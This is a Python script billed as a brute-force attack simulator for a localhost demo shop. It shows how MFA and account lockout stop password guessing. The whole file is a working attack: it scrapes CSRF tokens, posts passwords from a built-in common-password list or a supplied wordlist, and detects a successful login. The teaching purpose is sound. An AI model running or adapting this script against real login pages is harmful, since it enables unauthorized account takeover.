#!/usr/bin/env python3
"""
brute_force_simulator.py — Brute Force Attack Simulator
========================================================
Cybersecurity Research Tool | LuxCarry Demo Platform

PURPOSE:
    Demonstrates how a brute force attack works against a login endpoint.
    Shows that:
      - Without MFA: a correct password grants access
      - With MFA:    password alone is insufficient (OTP required)
      - Account lockout: halts the attack after N failures

USAGE:
    python3 brute_force_simulator.py --target demo_user --wordlist passwords.txt
    python3 brute_force_simulator.py --target demo_user --mode quick
    python3 brute_force_simulator.py --help

WARNING:
    This tool is for LOCAL research on localhost only.
    Using this against any system you do not own is ILLEGAL.
"""

import requests
import argparse
import time
import json
import re
from datetime import datetime
from pathlib import Path

# ── Configuration ──────────────────────────────────────────────────────────────
BASE_URL    = "http://localhost/luxury-handbag-website"
LOGIN_URL   = f"{BASE_URL}/auth/login.php"
LOG_FILE    = Path(__file__).parent.parent / "logs" / "attack_brute_force.log"
DELAY_SEC   = 0.5   # Delay between attempts (be respectful to localhost)
TIMEOUT_SEC = 5

# Quick wordlist for demo (common weak passwords)
QUICK_WORDLIST = [
    "password", "123456", "password123", "admin", "letmein",
    "qwerty", "abc123", "monkey", "1234567", "dragon",
    "master", "welcome", "sunshine", "princess", "shadow",
    "superman", "michael", "football", "baseball", "iloveyou",
    "trustno1", "123abc", "hello123", "pass123", "test",
    # Add the real password last for demo purposes
    "SecurePass123!", "demo123", "research2024",
]


def log_attempt(username: str, password: str, result: str, stage: str, ip: str = "127.0.0.1"):
    """Write structured log entry matching server-side format."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = (
        f"[{timestamp}] | USERNAME: {username:<20} | IP: {ip:<15} | "
        f"STAGE: {stage:<10} | RESULT: {result} | PASSWORD_TRIED: {password}\n"
    )
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(line)
    return line.strip()


def get_csrf_token(session: requests.Session) -> str:
    """Fetch the login page and extract the CSRF token from the form."""
    try:
        response = session.get(LOGIN_URL, timeout=TIMEOUT_SEC)
        match = re.search(r'name=["\']csrf_token["\'] value=["\']([a-f0-9]+)["\']', response.text)
        return match.group(1) if match else ""
    except requests.RequestException as e:
        print(f"  [!] Failed to fetch CSRF token: {e}")
        return ""


def attempt_login(session: requests.Session, username: str, password: str) -> dict:
    """
    Attempt a single login. Returns a dict with:
      - success:   bool
      - mfa_required: bool
      - locked:    bool
      - status_code: int
    """
    csrf = get_csrf_token(session)
    if not csrf:
        return {"success": False, "mfa_required": False, "locked": False, "error": "No CSRF"}

    payload = {
        "username":   username,
        "password":   password,
        "csrf_token": csrf,
    }

    try:
        response = session.post(LOGIN_URL, data=payload, timeout=TIMEOUT_SEC, allow_redirects=True)
        text = response.text.lower()
        url  = response.url

        # Detect outcomes by redirect target or page content
        mfa_required = "verify_otp" in url or "two-factor" in text or "otp" in url
        locked        = "account locked" in text or "locked" in text
        success       = "dashboard" in url and not mfa_required

        return {
            "success":      success,
            "mfa_required": mfa_required,
            "locked":       locked,
            "url":          url,
            "status_code":  response.status_code,
        }
    except requests.RequestException as e:
        return {"success": False, "mfa_required": False, "locked": False, "error": str(e)}


def run_brute_force(username: str, wordlist: list[str], delay: float = DELAY_SEC):
    """Main brute force loop."""
    session = requests.Session()
    session.headers.update({"User-Agent": "BruteForceSimulator/1.0 (Research)"})

    print("\n" + "═" * 60)
    print("  🔓 BRUTE FORCE ATTACK SIMULATOR")
    print("  Target  :", username)
    print("  Endpoint:", LOGIN_URL)
    print("  Wordlist :", f"{len(wordlist)} passwords")
    print("  Delay   :", f"{delay}s between attempts")
    print("═" * 60)

    results = {
        "total":        0,
        "failures":     0,
        "locked_at":    None,
        "mfa_blocked":  False,
        "cracked":      None,
        "started_at":   datetime.now().isoformat(),
    }

    for i, password in enumerate(wordlist, 1):
        print(f"  [{i:>4}/{len(wordlist)}] Trying: {password:<25}", end="")

        result = attempt_login(session, username, password)
        results["total"] += 1

        if result.get("locked"):
            print("⛔ ACCOUNT LOCKED")
            log = log_attempt(username, password, "ACCOUNT_LOCKED", "PASSWORD")
            results["locked_at"] = i
            print(f"\n  ⛔ Account locked after {i} attempts.")
            print("  ✅ LOCKOUT PROTECTION: Attack halted by server.\n")
            break

        elif result.get("mfa_required"):
            print("🛡️  MFA REQUIRED  ← Attack BLOCKED here")
            log = log_attempt(username, password, "PASSWORD_OK_MFA_BLOCKED", "PASSWORD")
            results["mfa_blocked"] = True
            results["cracked"]     = password
            print(f"\n  ✅ MFA PROTECTION: Password '{password}' is correct, but")
            print("     the attacker cannot proceed without the TOTP code.")
            print("     Attack effectively defeated at Step 2. ✓\n")
            break

        elif result.get("success"):
            print("✅ SUCCESS ← LOGIN GAINED!")
            log = log_attempt(username, password, "BRUTE_FORCE_SUCCESS", "PASSWORD")
            results["cracked"] = password
            print(f"\n  ⚠️  NO MFA: Account accessed with password '{password}'")
            print("     Enable MFA to prevent this! ⚠️\n")
            break

        else:
            print("✗ Failed")
            log = log_attempt(username, password, "FAILURE", "PASSWORD")
            results["failures"] += 1

        time.sleep(delay)

    # ── Summary ────────────────────────────────────────────────
    results["finished_at"] = datetime.now().isoformat()
    print("\n" + "─" * 60)
    print("  ATTACK SUMMARY")
    print(f"  Attempts made   : {results['total']}")
    print(f"  Failed attempts : {results['failures']}")
    if results["cracked"]:
        print(f"  Password found  : {results['cracked']}")
    if results["locked_at"]:
        print(f"  Locked at attempt: #{results['locked_at']}")
    if results["mfa_blocked"]:
        print("  MFA outcome     : ✅ Attack BLOCKED by MFA")
    elif results["cracked"] and not results["mfa_blocked"]:
        print("  MFA outcome     : ❌ No MFA — Account compromised!")
    print("─" * 60)

    # Save JSON summary
    summary_file = LOG_FILE.parent / "brute_force_summary.json"
    with open(summary_file, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n  📄 Log  : {LOG_FILE}")
    print(f"  📊 JSON : {summary_file}\n")

    return results


def main():
    parser = argparse.ArgumentParser(
        description="Brute Force Login Simulator — Research Tool for localhost only"
    )
    parser.add_argument("--target",   "-u", default="demo_user", help="Username to attack")
    parser.add_argument("--wordlist", "-w", help="Path to password wordlist (one per line)")
    parser.add_argument("--mode",     "-m", choices=["quick", "custom"], default="quick",
                        help="quick=built-in list, custom=provide --wordlist")
    parser.add_argument("--delay",    "-d", type=float, default=DELAY_SEC,
                        help=f"Delay between attempts in seconds (default: {DELAY_SEC})")
    args = parser.parse_args()

    if args.mode == "custom" and not args.wordlist:
        parser.error("--mode custom requires --wordlist <file>")

    if args.wordlist:
        wl_path = Path(args.wordlist)
        if not wl_path.exists():
            print(f"Wordlist not found: {wl_path}")
            return
        passwords = wl_path.read_text().splitlines()
        passwords = [p.strip() for p in passwords if p.strip()]
    else:
        passwords = QUICK_WORDLIST

    run_brute_force(args.target, passwords, args.delay)


if __name__ == "__main__":
    main()
